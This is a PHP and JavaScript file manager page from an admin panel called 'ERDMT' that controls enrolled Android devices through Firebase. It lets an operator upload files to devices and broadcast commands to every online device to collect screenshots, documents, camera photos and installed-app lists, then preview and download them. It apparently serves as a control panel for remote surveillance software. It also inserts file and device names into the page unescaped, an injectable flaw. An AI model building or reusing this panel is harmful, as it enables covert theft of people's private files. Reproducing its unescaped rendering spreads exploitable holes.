<?php
session_start();
require_once 'config/firebase.php';
require_once 'includes/auth.php';
require_once 'includes/functions.php';

requireLogin();

$pageTitle = 'File Manager - ERDMT Admin Panel';
include 'includes/header.php';

// Handle file upload
if ($_POST && isset($_POST['action']) && $_POST['action'] === 'upload_file') {
    if (!verifyCSRFToken($_POST['csrf_token'] ?? '')) {
        $error = 'Invalid request';
    } else if (isset($_FILES['file']) && isset($_POST['device_id'])) {
        $file = $_FILES['file'];
        $deviceId = $_POST['device_id'];
        $targetPath = $_POST['target_path'] ?? '/storage/emulated/0/Download/';
        
        if ($file['error'] === UPLOAD_ERR_OK) {
            $fileData = file_get_contents($file['tmp_name']);
            if (uploadFileToDevice($deviceId, $file['name'], $fileData, $targetPath)) {
                $success = 'File uploaded successfully';
            } else {
                $error = 'Failed to upload file';
            }
        } else {
            $error = 'File upload error: ' . $file['error'];
        }
    }
}
?>

<div class="container-fluid">
    <div class="row">
        <!-- Sidebar -->
        <nav class="col-md-3 col-lg-2 d-md-block bg-light sidebar">
            <div class="position-sticky pt-3">
                <ul class="nav flex-column">
                    <li class="nav-item">
                        <a class="nav-link" href="index.php">
                            <i class="fas fa-tachometer-alt"></i> Dashboard
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="devices.php">
                            <i class="fas fa-mobile-alt"></i> Devices
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="commands.php">
                            <i class="fas fa-terminal"></i> Commands
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="files.php">
                            <i class="fas fa-folder"></i> File Manager
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="messages.php">
                            <i class="fas fa-comments"></i> Messages
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="settings.php">
                            <i class="fas fa-cog"></i> Settings
                        </a>
                    </li>
                </ul>
            </div>
        </nav>

        <!-- Main content -->
        <main class="col-md-9 ms-sm-auto col-lg-10 px-md-4">
            <div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
                <h1 class="h2">File Manager</h1>
                <div class="btn-toolbar mb-2 mb-md-0">
                    <div class="btn-group me-2">
                        <button type="button" class="btn btn-sm btn-outline-secondary" onclick="loadFileTransfers()">
                            <i class="fas fa-sync-alt"></i> Refresh
                        </button>
                        <button type="button" class="btn btn-sm btn-primary" data-bs-toggle="modal" data-bs-target="#uploadFileModal">
                            <i class="fas fa-upload"></i> Upload File
                        </button>
                    </div>
                </div>
            </div>

            <?php if (isset($error)): ?>
                <div class="alert alert-danger">
                    <i class="fas fa-exclamation-triangle"></i> <?php echo $error; ?>
                </div>
            <?php endif; ?>

            <?php if (isset($success)): ?>
                <div class="alert alert-success">
                    <i class="fas fa-check-circle"></i> <?php echo $success; ?>
                </div>
            <?php endif; ?>

            <!-- File Upload Section -->
            <div class="row mb-4">
                <div class="col-md-8">
                    <div class="card">
                        <div class="card-header">
                            <h5 class="mb-0">Quick File Operations</h5>
                        </div>
                        <div class="card-body">
                            <div class="row">
                                <div class="col-md-6">
                                    <h6>Common Operations</h6>
                                    <div class="d-grid gap-2">
                                        <button class="btn btn-outline-primary" onclick="requestFiles('all', 'screenshots')">
                                            <i class="fas fa-camera"></i> Get All Screenshots
                                        </button>
                                        <button class="btn btn-outline-success" onclick="requestFiles('all', 'documents')">
                                            <i class="fas fa-file-alt"></i> Get Documents
                                        </button>
                                        <button class="btn btn-outline-info" onclick="requestFiles('all', 'media')">
                                            <i class="fas fa-images"></i> Get Media Files
                                        </button>
                                        <button class="btn btn-outline-warning" onclick="requestFiles('all', 'apps')">
                                            <i class="fas fa-mobile-alt"></i> Get Installed Apps
                                        </button>
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <h6>Bulk Actions</h6>
                                    <div class="d-grid gap-2">
                                        <button class="btn btn-outline-secondary" onclick="clearCache('all')">
                                            <i class="fas fa-broom"></i> Clear All Cache
                                        </button>
                                        <button class="btn btn-outline-danger" onclick="deleteFiles('all', 'temp')">
                                            <i class="fas fa-trash"></i> Delete Temp Files
                                        </button>
                                        <button class="btn btn-outline-primary" onclick="backupFiles('all')">
                                            <i class="fas fa-archive"></i> Backup Important Files
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="col-md-4">
                    <div class="card">
                        <div class="card-header">
                            <h5 class="mb-0">Storage Usage</h5>
                        </div>
                        <div class="card-body">
                            <div class="mb-3">
                                <div class="d-flex justify-content-between">
                                    <span>Used Space</span>
                                    <span id="usedSpace">Loading...</span>
                                </div>
                                <div class="progress">
                                    <div class="progress-bar" id="storageProgress" role="progressbar" style="width: 0%"></div>
                                </div>
                            </div>
                            <div class="small text-muted">
                                <div>Files: <span id="fileCount">0</span></div>
                                <div>Active Transfers: <span id="activeTransfers">0</span></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- File Transfers -->
            <div class="card">
                <div class="card-header d-flex justify-content-between align-items-center">
                    <h5 class="mb-0">File Transfers</h5>
                    <div class="btn-group btn-group-sm">
                        <button class="btn btn-outline-secondary active" onclick="filterTransfers('all')">All</button>
                        <button class="btn btn-outline-warning" onclick="filterTransfers('pending')">Pending</button>
                        <button class="btn btn-outline-info" onclick="filterTransfers('uploading')">Uploading</button>
                        <button class="btn btn-outline-success" onclick="filterTransfers('completed')">Completed</button>
                        <button class="btn btn-outline-danger" onclick="filterTransfers('failed')">Failed</button>
                    </div>
                </div>
                <div class="card-body">
                    <div class="table-responsive">
                        <table class="table table-striped">
                            <thead>
                                <tr>
                                    <th>Time</th>
                                    <th>Device</th>
                                    <th>File Name</th>
                                    <th>Size</th>
                                    <th>Target Path</th>
                                    <th>Status</th>
                                    <th>Progress</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody id="transfersTableBody">
                                <tr>
                                    <td colspan="8" class="text-center">
                                        <div class="spinner-border" role="status">
                                            <span class="visually-hidden">Loading...</span>
                                        </div>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </main>
    </div>
</div>

<!-- Upload File Modal -->
<div class="modal fade" id="uploadFileModal" tabindex="-1">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Upload File to Device</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <form method="POST" enctype="multipart/form-data">
                <div class="modal-body">
                    <input type="hidden" name="action" value="upload_file">
                    <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                    
                    <div class="mb-3">
                        <label for="uploadDeviceSelect" class="form-label">Select Device</label>
                        <select class="form-select" name="device_id" id="uploadDeviceSelect" required>
                            <option value="">Loading devices...</option>
                        </select>
                    </div>
                    
                    <div class="mb-3">
                        <label for="fileUpload" class="form-label">Select File</label>
                        <input type="file" class="form-control" name="file" id="fileUpload" required>
                        <div class="form-text">Maximum file size: 10MB</div>
                    </div>
                    
                    <div class="mb-3">
                        <label for="targetPath" class="form-label">Target Path</label>
                        <select class="form-select" name="target_path" id="targetPath">
                            <option value="/storage/emulated/0/Download/">Downloads</option>
                            <option value="/storage/emulated/0/Pictures/">Pictures</option>
                            <option value="/storage/emulated/0/Documents/">Documents</option>
                            <option value="/storage/emulated/0/Music/">Music</option>
                            <option value="/storage/emulated/0/Movies/">Movies</option>
                            <option value="/sdcard/">SD Card Root</option>
                        </select>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="submit" class="btn btn-primary">Upload File</button>
                </div>
            </form>
        </div>
    </div>
</div>

<!-- File Preview Modal -->
<div class="modal fade" id="filePreviewModal" tabindex="-1">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">File Preview</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body" id="filePreviewContent">
                <!-- Content loaded dynamically -->
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                <button type="button" class="btn btn-primary" onclick="downloadFile()">Download</button>
            </div>
        </div>
    </div>
</div>

<script>
// Firebase configuration
const firebaseConfig = {
    apiKey: "<?php echo FIREBASE_API_KEY; ?>",
    authDomain: "<?php echo FIREBASE_PROJECT_ID; ?>.firebaseapp.com",
    databaseURL: "<?php echo FIREBASE_DATABASE_URL; ?>",
    projectId: "<?php echo FIREBASE_PROJECT_ID; ?>",
    storageBucket: "<?php echo FIREBASE_STORAGE_BUCKET; ?>",
    messagingSenderId: "<?php echo FIREBASE_PROJECT_NUMBER; ?>",
    appId: "<?php echo FIREBASE_APP_ID; ?>"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();
const storage = firebase.storage();

let devicesData = {};
let transfersData = {};
let currentFilter = 'all';

function loadDevices() {
    database.ref('devices').on('value', (snapshot) => {
        devicesData = snapshot.val() || {};
        updateDeviceSelects();
    });
}

function loadFileTransfers() {
    database.ref('file_transfers').on('value', (snapshot) => {
        transfersData = snapshot.val() || {};
        updateTransfersTable();
        updateStorageStats();
    });
}

function updateDeviceSelects() {
    const selects = document.querySelectorAll('#uploadDeviceSelect');
    let html = '<option value="">Select a device</option>';
    
    Object.entries(devicesData).forEach(([deviceId, device]) => {
        const status = getDeviceStatus(device);
        const statusIcon = status.text === 'Online' ? '🟢' : '🔴';
        html += `<option value="${deviceId}">${statusIcon} ${device.name || deviceId}</option>`;
    });
    
    selects.forEach(select => {
        select.innerHTML = html;
    });
}

function updateTransfersTable() {
    const tbody = document.getElementById('transfersTableBody');
    let html = '';
    let allTransfers = [];
    
    // Flatten transfers from all devices
    Object.entries(transfersData).forEach(([deviceId, transfers]) => {
        Object.entries(transfers || {}).forEach(([transferId, transfer]) => {
            allTransfers.push({
                ...transfer,
                deviceId: deviceId,
                transferId: transferId,
                deviceName: devicesData[deviceId]?.name || deviceId
            });
        });
    });
    
    // Sort by timestamp (newest first)
    allTransfers.sort((a, b) => b.upload_time - a.upload_time);
    
    // Filter transfers
    if (currentFilter !== 'all') {
        allTransfers = allTransfers.filter(transfer => transfer.status === currentFilter);
    }
    
    // Limit to last 50 transfers for performance
    allTransfers = allTransfers.slice(0, 50);
    
    if (allTransfers.length === 0) {
        html = '<tr><td colspan="8" class="text-center text-muted">No file transfers found</td></tr>';
    } else {
        allTransfers.forEach(transfer => {
            const statusBadge = getTransferStatusBadge(transfer.status);
            const progress = transfer.progress || 0;
            const fileSize = formatFileSize(transfer.file_size || 0);
            
            html += `
                <tr>
                    <td>${formatTimestamp(transfer.upload_time)}</td>
                    <td>${transfer.deviceName}</td>
                    <td>
                        <i class="fas fa-${getFileIcon(transfer.file_name)}"></i>
                        ${transfer.file_name}
                    </td>
                    <td>${fileSize}</td>
                    <td><small>${transfer.target_path}</small></td>
                    <td>${statusBadge}</td>
                    <td>
                        <div class="progress" style="width: 100px;">
                            <div class="progress-bar" role="progressbar" style="width: ${progress}%"></div>
                        </div>
                        <small>${progress}%</small>
                    </td>
                    <td>
                        <div class="btn-group btn-group-sm">
                            ${transfer.status === 'completed' ? 
                                `<button class="btn btn-outline-primary" onclick="previewFile('${transfer.deviceId}', '${transfer.transferId}')" title="Preview">
                                    <i class="fas fa-eye"></i>
                                </button>` : ''
                            }
                            <button class="btn btn-outline-secondary" onclick="retryTransfer('${transfer.deviceId}', '${transfer.transferId}')" title="Retry">
                                <i class="fas fa-redo"></i>
                            </button>
                            <button class="btn btn-outline-danger" onclick="cancelTransfer('${transfer.deviceId}', '${transfer.transferId}')" title="Cancel">
                                <i class="fas fa-times"></i>
                            </button>
                        </div>
                    </td>
                </tr>
            `;
        });
    }
    
    tbody.innerHTML = html;
}

function updateStorageStats() {
    let totalSize = 0;
    let fileCount = 0;
    let activeTransfers = 0;
    
    Object.values(transfersData).forEach(deviceTransfers => {
        Object.values(deviceTransfers || {}).forEach(transfer => {
            fileCount++;
            totalSize += transfer.file_size || 0;
            if (transfer.status === 'pending' || transfer.status === 'uploading') {
                activeTransfers++;
            }
        });
    });
    
    document.getElementById('usedSpace').textContent = formatFileSize(totalSize);
    document.getElementById('fileCount').textContent = fileCount;
    document.getElementById('activeTransfers').textContent = activeTransfers;
    
    // Update progress bar (assuming 1GB limit)
    const maxStorage = 1024 * 1024 * 1024; // 1GB
    const usagePercent = Math.min((totalSize / maxStorage) * 100, 100);
    document.getElementById('storageProgress').style.width = usagePercent + '%';
    
    if (usagePercent > 90) {
        document.getElementById('storageProgress').className = 'progress-bar bg-danger';
    } else if (usagePercent > 75) {
        document.getElementById('storageProgress').className = 'progress-bar bg-warning';
    } else {
        document.getElementById('storageProgress').className = 'progress-bar bg-success';
    }
}

function getTransferStatusBadge(status) {
    const badges = {
        'pending': '<span class="badge bg-warning">Pending</span>',
        'uploading': '<span class="badge bg-info">Uploading</span>',
        'completed': '<span class="badge bg-success">Completed</span>',
        'failed': '<span class="badge bg-danger">Failed</span>',
        'cancelled': '<span class="badge bg-secondary">Cancelled</span>'
    };
    
    return badges[status] || '<span class="badge bg-secondary">Unknown</span>';
}

function getFileIcon(filename) {
    const ext = filename.split('.').pop().toLowerCase();
    const icons = {
        'jpg': 'image', 'jpeg': 'image', 'png': 'image', 'gif': 'image',
        'mp4': 'video', 'avi': 'video', 'mov': 'video',
        'mp3': 'music', 'wav': 'music', 'flac': 'music',
        'pdf': 'file-pdf', 'doc': 'file-word', 'docx': 'file-word',
        'xls': 'file-excel', 'xlsx': 'file-excel',
        'ppt': 'file-powerpoint', 'pptx': 'file-powerpoint',
        'zip': 'file-archive', 'rar': 'file-archive', '7z': 'file-archive',
        'apk': 'mobile-alt',
        'txt': 'file-alt'
    };
    
    return icons[ext] || 'file';
}

function filterTransfers(filter) {
    currentFilter = filter;
    updateTransfersTable();
    
    // Update active button
    document.querySelectorAll('.btn-group .btn').forEach(btn => {
        btn.classList.remove('active');
    });
    event.target.classList.add('active');
}

function requestFiles(deviceId, fileType) {
    let command = '';
    let params = {};
    
    switch (fileType) {
        case 'screenshots':
            command = 'get_files';
            params = { path: '/storage/emulated/0/Pictures/Screenshots/', type: 'images' };
            break;
        case 'documents':
            command = 'get_files';
            params = { path: '/storage/emulated/0/Documents/', type: 'documents' };
            break;
        case 'media':
            command = 'get_files';
            params = { path: '/storage/emulated/0/DCIM/Camera/', type: 'media' };
            break;
        case 'apps':
            command = 'get_installed_apps';
            params = {};
            break;
    }
    
    if (deviceId === 'all') {
        sendToAllDevices(command, params);
    } else {
        sendCommandToDevice(deviceId, command, params);
    }
}

function sendToAllDevices(command, params) {
    const onlineDevices = Object.entries(devicesData).filter(([id, device]) => 
        getDeviceStatus(device).text === 'Online'
    );
    
    if (onlineDevices.length === 0) {
        showAlert('No online devices found', 'warning');
        return;
    }
    
    showLoading();
    
    const promises = onlineDevices.map(([deviceId]) => {
        const commandData = {
            command: command,
            params: params,
            timestamp: Date.now(),
            status: 'pending',
            admin_id: '<?php echo $_SESSION['admin_user_id'] ?? 'unknown'; ?>'
        };
        
        const commandId = 'cmd_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        return database.ref(`commands/${deviceId}/${commandId}`).set(commandData);
    });
    
    Promise.all(promises)
        .then(() => {
            hideLoading();
            showAlert(`Command sent to ${onlineDevices.length} devices`, 'success');
        })
        .catch(error => {
            hideLoading();
            showAlert('Failed to send commands: ' + error.message, 'danger');
        });
}

function previewFile(deviceId, transferId) {
    const transfer = transfersData[deviceId]?.[transferId];
    if (!transfer || !transfer.file_data) return;
    
    const content = `
        <div class="mb-3">
            <h6>File Information</h6>
            <table class="table table-sm">
                <tr><td><strong>File Name:</strong></td><td>${transfer.file_name}</td></tr>
                <tr><td><strong>Size:</strong></td><td>${formatFileSize(transfer.file_size)}</td></tr>
                <tr><td><strong>Target Path:</strong></td><td>${transfer.target_path}</td></tr>
                <tr><td><strong>Upload Time:</strong></td><td>${formatTimestamp(transfer.upload_time)}</td></tr>
            </table>
        </div>
        <div class="mb-3">
            <h6>File Preview</h6>
            ${getFilePreview(transfer)}
        </div>
    `;
    
    document.getElementById('filePreviewContent').innerHTML = content;
    new bootstrap.Modal(document.getElementById('filePreviewModal')).show();
}

function getFilePreview(transfer) {
    const ext = transfer.file_name.split('.').pop().toLowerCase();
    const dataUrl = 'data:application/octet-stream;base64,' + transfer.file_data;
    
    if (['jpg', 'jpeg', 'png', 'gif'].includes(ext)) {
        return `<img src="data:image/${ext};base64,${transfer.file_data}" class="img-fluid" alt="Preview">`;
    } else if (ext === 'txt') {
        try {
            const text = atob(transfer.file_data);
            return `<pre class="bg-light p-3 rounded">${text}</pre>`;
        } catch (e) {
            return '<p class="text-muted">Cannot preview this file type</p>';
        }
    } else {
        return `
            <div class="text-center">
                <i class="fas fa-${getFileIcon(transfer.file_name)} fa-5x text-muted mb-3"></i>
                <p>File preview not available for this type</p>
                <a href="${dataUrl}" download="${transfer.file_name}" class="btn btn-primary">
                    <i class="fas fa-download"></i> Download File
                </a>
            </div>
        `;
    }
}

function retryTransfer(deviceId, transferId) {
    const transfer = transfersData[deviceId]?.[transferId];
    if (!transfer) return;
    
    const updatedTransfer = {
        ...transfer,
        status: 'pending',
        progress: 0,
        retry_time: Date.now()
    };
    
    database.ref(`file_transfers/${deviceId}/${transferId}`).update(updatedTransfer)
        .then(() => {
            showAlert('Transfer retry initiated', 'success');
        })
        .catch(error => {
            showAlert('Failed to retry transfer: ' + error.message, 'danger');
        });
}

function cancelTransfer(deviceId, transferId) {
    if (!confirm('Cancel this file transfer?')) return;
    
    database.ref(`file_transfers/${deviceId}/${transferId}`).update({
        status: 'cancelled',
        cancelled_time: Date.now()
    })
    .then(() => {
        showAlert('Transfer cancelled', 'success');
    })
    .catch(error => {
        showAlert('Failed to cancel transfer: ' + error.message, 'danger');
    });
}

function getDeviceStatus(device) {
    if (!device.lastSeen) return { text: 'Never Connected', color: 'secondary' };
    
    const now = Date.now();
    const lastSeen = device.lastSeen;
    const timeDiff = now - lastSeen;
    
    if (timeDiff < 300000) { // 5 minutes
        return { text: 'Online', color: 'success' };
    } else if (timeDiff < 3600000) { // 1 hour
        return { text: 'Recently Active', color: 'warning' };
    } else {
        return { text: 'Offline', color: 'danger' };
    }
}

// Load data on page load
document.addEventListener('DOMContentLoaded', function() {
    loadDevices();
    loadFileTransfers();
});

// Auto-refresh every 30 seconds
startAutoRefresh(() => {
    loadFileTransfers();
}, 30000);
</script>

<?php include 'includes/footer.php'; ?>